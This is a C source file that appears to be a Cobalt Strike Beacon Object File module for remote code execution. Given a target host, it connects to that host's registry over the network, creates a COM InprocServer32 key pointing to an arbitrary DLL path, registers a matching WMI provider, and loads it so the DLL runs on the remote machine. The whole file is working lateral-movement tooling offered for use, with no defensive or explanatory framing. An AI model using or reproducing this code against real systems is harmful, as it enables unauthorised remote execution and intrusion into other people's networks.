#include <windows.h>

#include "beacon.h"
#include "provider.h"
#include "rex.h"
#include "wmi.h"

DECLSPEC_IMPORT LSTATUS WINAPI ADVAPI32$RegConnectRegistryW(LPCWSTR, HKEY,
                                                            PHKEY);
DECLSPEC_IMPORT LSTATUS WINAPI ADVAPI32$RegOpenKeyExW(HKEY, LPCWSTR, DWORD,
                                                      REGSAM, PHKEY);
DECLSPEC_IMPORT LSTATUS WINAPI
ADVAPI32$RegCreateKeyExW(HKEY, LPCWSTR, DWORD, LPWSTR, DWORD, REGSAM,
                         const LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD);
DECLSPEC_IMPORT LSTATUS WINAPI ADVAPI32$RegSetValueExW(HKEY, LPCWSTR, DWORD,
                                                       DWORD, const BYTE *,
                                                       DWORD);
DECLSPEC_IMPORT LSTATUS WINAPI ADVAPI32$RegCloseKey(HKEY);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap(void);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);

typedef struct {
    rex_wmi_session *wmi;
    rex_wmi_session *control;
    HKEY registry;
    wchar_t class_key_path[512];
    wchar_t key_path[512];
} rex_provider_state;

static BOOL rex_provider_name_valid(const wchar_t *value) {
    SIZE_T index;
    if (value == NULL || value[0] == L'\0')
        return FALSE;
    for (index = 0; value[index] != L'\0'; index++) {
        wchar_t c = value[index];
        if (!((c >= L'a' && c <= L'z') || (c >= L'A' && c <= L'Z') ||
              (c >= L'0' && c <= L'9') || c == L'_' || c == L'-'))
            return FALSE;
    }
    return TRUE;
}

static BOOL rex_guid_valid(const wchar_t *value) {
    SIZE_T index;
    if (rex_wcslen(value) != 38 || value[0] != L'{' || value[37] != L'}')
        return FALSE;
    for (index = 1; index < 37; index++) {
        wchar_t c = value[index];
        if (index == 9 || index == 14 || index == 19 || index == 24) {
            if (c != L'-')
                return FALSE;
        } else if (!((c >= L'0' && c <= L'9') || (c >= L'a' && c <= L'f') ||
                     (c >= L'A' && c <= L'F')))
            return FALSE;
    }
    return TRUE;
}

static BOOL rex_provider_keys(const wchar_t *class_id, wchar_t class_key[512],
                              wchar_t server_key[512]) {
    const wchar_t *prefix = L"SOFTWARE\\Classes\\CLSID\\";
    const wchar_t *suffix = L"\\InprocServer32";
    SIZE_T index = 0, source = 0;
    while (prefix[source] != L'\0')
        class_key[index++] = prefix[source++];
    source = 0;
    while (class_id[source] != L'\0' && index + 1 < 512)
        class_key[index++] = class_id[source++];
    if (class_id[source] != L'\0')
        return FALSE;
    class_key[index] = L'\0';
    rex_copy(server_key, class_key, (index + 1) * sizeof(wchar_t));
    source = 0;
    while (suffix[source] != L'\0' && index + 1 < 512)
        server_key[index++] = suffix[source++];
    if (suffix[source] != L'\0')
        return FALSE;
    server_key[index] = L'\0';
    return TRUE;
}

HRESULT rex_provider_decode(const rex_arguments *arguments,
                            rex_request *request, rex_provider_role role) {
    if (!rex_provider_name_valid(arguments->values[0]) ||
        !rex_guid_valid(arguments->values[1]) ||
        arguments->values[2][0] == L'\0')
        return E_INVALIDARG;
    request->config.provider.name = arguments->values[0];
    request->config.provider.class_id = arguments->values[1];
    request->config.provider.dll_path = arguments->values[2];
    request->config.provider.role = role;
    return S_OK;
}

HRESULT rex_provider_preflight(const rex_request *request, rex_state *generic) {
    HANDLE heap = KERNEL32$GetProcessHeap();
    rex_provider_state *state = (rex_provider_state *)KERNEL32$HeapAlloc(
        heap, HEAP_ZERO_MEMORY, sizeof(*state));
    wchar_t target[REX_MAX_TARGET + 1];
    HKEY collision = NULL;
    BOOL exists;
    LSTATUS status;
    HRESULT result;
    if (state == NULL)
        return E_OUTOFMEMORY;
    result =
        rex_wmi_open_namespace(request->target, L"ROOT\\DEFAULT", &state->wmi);
    if (FAILED(result))
        goto cleanup;
    result = rex_wmi_open_namespace(request->target, L"ROOT\\CIMV2",
                                    &state->control);
    if (FAILED(result))
        goto cleanup;
    result = rex_wmi_provider_exists(state->wmi, request->config.provider.name,
                                     &exists);
    if (FAILED(result) || exists) {
        if (SUCCEEDED(result))
            result = HRESULT_FROM_WIN32(ERROR_ALREADY_EXISTS);
        goto cleanup;
    }
    if (request->config.provider.role != REX_PROVIDER_ROLE_INITIALIZATION) {
        result = rex_wmi_provider_role_exists(
            state->wmi, request->config.provider.name,
            request->config.provider.role, &exists);
        if (FAILED(result) || exists) {
            if (SUCCEEDED(result))
                result = HRESULT_FROM_WIN32(ERROR_ALREADY_EXISTS);
            goto cleanup;
        }
    }
    if (!toWideChar((char *)request->target, target, sizeof(target)) ||
        !rex_provider_keys(request->config.provider.class_id,
                           state->class_key_path, state->key_path)) {
        result = E_INVALIDARG;
        goto cleanup;
    }
    if (rex_wcslen(request->config.provider.name) >= 256) {
        result = E_INVALIDARG;
        goto cleanup;
    }
    status = ADVAPI32$RegConnectRegistryW(target, HKEY_LOCAL_MACHINE,
                                          &state->registry);
    if (status != ERROR_SUCCESS) {
        result = HRESULT_FROM_WIN32(status);
        goto cleanup;
    }
    status = ADVAPI32$RegOpenKeyExW(state->registry, state->key_path, 0,
                                    KEY_READ, &collision);
    if (status == ERROR_SUCCESS) {
        result = HRESULT_FROM_WIN32(ERROR_ALREADY_EXISTS);
        goto cleanup;
    }
    if (status != ERROR_FILE_NOT_FOUND) {
        result = HRESULT_FROM_WIN32(status);
        goto cleanup;
    }
    generic->private_data = state;
    return S_OK;
cleanup:
    if (collision != NULL)
        ADVAPI32$RegCloseKey(collision);
    if (state->registry != NULL)
        ADVAPI32$RegCloseKey(state->registry);
    if (state->control != NULL)
        rex_wmi_close(state->control);
    if (state->wmi != NULL)
        rex_wmi_close(state->wmi);
    KERNEL32$HeapFree(heap, 0, state);
    return result;
}

HRESULT rex_provider_execute(const rex_request *request, rex_state *generic,
                             rex_observation *observation) {
    rex_provider_state *state = (rex_provider_state *)generic->private_data;
    HKEY key = NULL;
    DWORD disposition;
    const wchar_t *threading = L"Both";
    LSTATUS status;
    HRESULT result;
    status = ADVAPI32$RegCreateKeyExW(state->registry, state->key_path, 0, NULL,
                                      0, KEY_WRITE, NULL, &key, &disposition);
    if (status != ERROR_SUCCESS || disposition != REG_CREATED_NEW_KEY) {
        result = status == ERROR_SUCCESS
                     ? HRESULT_FROM_WIN32(ERROR_ALREADY_EXISTS)
                     : HRESULT_FROM_WIN32(status);
        goto finish;
    }
    observation->recovery.kind = REX_RECOVERY_REMOVE_PROVIDER;
    observation->recovery.value.provider.name = request->config.provider.name;
    observation->recovery.value.provider.class_id =
        request->config.provider.class_id;
    observation->recovery.value.provider.dll_path =
        request->config.provider.dll_path;
    observation->recovery.value.provider.role = request->config.provider.role;
    status = ADVAPI32$RegSetValueExW(
        key, NULL, 0, REG_SZ, (const BYTE *)request->config.provider.dll_path,
        (DWORD)((rex_wcslen(request->config.provider.dll_path) + 1) *
                sizeof(wchar_t)));
    if (status == ERROR_SUCCESS)
        status = ADVAPI32$RegSetValueExW(
            key, L"ThreadingModel", 0, REG_SZ, (const BYTE *)threading,
            (DWORD)((rex_wcslen(threading) + 1) * sizeof(wchar_t)));
    if (status != ERROR_SUCCESS) {
        result = HRESULT_FROM_WIN32(status);
        goto finish;
    }
    result =
        rex_wmi_provider_register(state->wmi, request->config.provider.name,
                                  request->config.provider.class_id);
    if (FAILED(result))
        goto finish;
    if (request->config.provider.role != REX_PROVIDER_ROLE_INITIALIZATION) {
        result = rex_wmi_provider_role_register(state->wmi,
                                                request->config.provider.name,
                                                request->config.provider.role);
        if (FAILED(result))
            goto finish;
    }
    result =
        rex_wmi_provider_load(state->control, request->config.provider.name);
finish:
    if (key != NULL)
        ADVAPI32$RegCloseKey(key);
    return result;
}

void rex_provider_release(rex_state *generic) {
    rex_provider_state *state = (rex_provider_state *)generic->private_data;
    HANDLE heap;
    if (state == NULL)
        return;
    if (state->registry != NULL)
        ADVAPI32$RegCloseKey(state->registry);
    if (state->control != NULL)
        rex_wmi_close(state->control);
    if (state->wmi != NULL)
        rex_wmi_close(state->wmi);
    heap = KERNEL32$GetProcessHeap();
    KERNEL32$HeapFree(heap, 0, state);
    generic->private_data = NULL;
}
